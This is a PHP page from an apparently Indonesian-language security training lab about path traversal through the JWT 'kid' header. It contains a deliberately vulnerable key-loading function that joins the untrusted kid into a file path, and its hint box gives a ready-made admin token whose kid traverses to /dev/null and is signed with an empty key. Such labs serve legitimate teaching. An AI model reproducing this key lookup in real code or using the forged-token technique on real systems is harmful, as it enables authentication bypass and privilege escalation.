<?php
$title = 'Lab 4: Path Traversal Lewat Header kid';
require_once __DIR__ . '/lib.php';

function lab4_key_for_kid($kid) {
    // VULNERABLE: "kid" (Key ID) is meant to let the server pick which
    // signing key to use among several - but it's attacker-controlled
    // (it comes from the token header, before any verification happens)
    // and is concatenated into a filesystem path with NO sanitisation
    // (no basename(), no realpath()+prefix check).
    $path = __DIR__ . '/keys/' . $kid;
    return file_exists($path) ? file_get_contents($path) : false;
}

if (empty($_SESSION['lab4_token'])) {
    $key = file_get_contents(__DIR__ . '/keys/hs256.key');
    $_SESSION['lab4_token'] = jwt_issue_hs256(['username' => 'guest', 'role' => 'user'], $key, ['kid' => 'hs256.key']);
}

$verify_result = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['token'])) {
    $p = jwt_parts(trim($_POST['token']));
    if ($p) {
        $kid = $p['header']['kid'] ?? 'hs256.key';
        $key = lab4_key_for_kid($kid);
        if ($key !== false) {
            $expected = b64url_encode(hash_hmac('sha256', $p['signing_input'], $key, true));
            if (hash_equals($expected, $p['raw'][2] ?? '') && ($p['payload']['role'] ?? '') === 'admin') {
                $verify_result = 'Token diterima! Login sebagai admin (username: ' . htmlspecialchars($p['payload']['username'] ?? '?') . ', kid dipakai: ' . htmlspecialchars($kid) . ').';
            } elseif (hash_equals($expected, $p['raw'][2] ?? '')) {
                $verify_result = 'Token valid, tapi role bukan admin.';
            } else {
                $verify_result = 'Signature tidak valid untuk kid tersebut.';
            }
        } else {
            $verify_result = 'File kunci untuk kid tersebut tidak ditemukan.';
        }
    } else {
        $verify_result = 'Format token tidak valid.';
    }
}

$forged_header = '{"typ":"JWT","alg":"HS256","kid":"../../../../../../dev/null"}';
$h_enc = b64url_encode($forged_header);
$p_enc = b64url_encode('{"username":"admin","role":"admin"}');
$sig = b64url_encode(hash_hmac('sha256', "$h_enc.$p_enc", '', true));
$forged = "$h_enc.$p_enc.$sig";

include 'header.php';
?>

<details class="hint-box">
<summary>Lihat Hint</summary>
<p class="hint">Goal: token asli punya header <code>kid: "hs256.key"</code> yang memberitahu
server file kunci mana yang harus dibaca dari folder <code>keys/</code> untuk verifikasi HMAC.
Server membangun path dengan <code>__DIR__ . '/keys/' . $kid</code> tanpa sanitasi apa pun —
persis pola Local File Inclusion / path traversal yang sudah kamu pelajari di kategori
Injection, tapi sekarang lewat header JWT. Arahkan <code>kid</code> ke file yang (a) pasti ada
di container Linux manapun, dan (b) isinya sudah kamu ketahui persis: <code>/dev/null</code>,
yang selalu kosong. Kalau server membaca <code>/dev/null</code> sebagai kunci, itu artinya
kuncinya adalah <strong>string kosong</strong> &mdash; dan kamu bisa menandatangani token
sendiri dengan kunci kosong itu.</p>
<p class="hint">Header hasil edit (kid diarahkan ke <code>/dev/null</code> lewat traversal):</p>
<pre><?php echo htmlspecialchars($forged_header); ?></pre>
<p class="hint">Token lengkap (ditandatangani HMAC-SHA256 dengan kunci string kosong):</p>
<pre><?php echo $forged; ?></pre>
</details>

<p>Token asli kamu (role: user, kid: hs256.key):</p>
<textarea readonly rows="3" style="width:100%;font-family:monospace;"><?php echo htmlspecialchars($_SESSION['lab4_token']); ?></textarea>

<h3>Verify Token</h3>
<form method="post">
  <textarea name="token" rows="3" style="width:100%;font-family:monospace;"><?php echo htmlspecialchars($forged); ?></textarea>
  <button type="submit">Verify &amp; Login</button>
</form>
<?php if ($verify_result): ?><div class="<?php echo strpos($verify_result,'admin (')!==false ? 'result-box' : 'error-box'; ?>"><?php echo $verify_result; ?></div><?php endif; ?>

<?php include 'footer.php'; ?>
